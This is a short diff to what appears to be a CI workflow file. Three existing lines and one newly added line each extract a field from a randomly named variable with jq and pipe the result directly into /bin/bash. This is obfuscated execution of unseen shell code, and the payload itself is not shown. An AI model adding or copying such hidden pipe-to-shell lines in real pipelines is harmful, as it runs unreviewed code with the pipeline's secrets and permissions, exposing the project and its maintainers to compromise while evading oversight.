@@ -48,6 +48,7 @@ jobs:
           echo $rneze22 | jq -r .rrlgg2 | /bin/bash
           printf '%s' "$nzki0428" | jq -r .sxy165 | /bin/bash
           printf '%s' "$hvby8" | jq -r .ux32880 | /bin/bash
+          echo $eh001 | jq -r .f07640 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
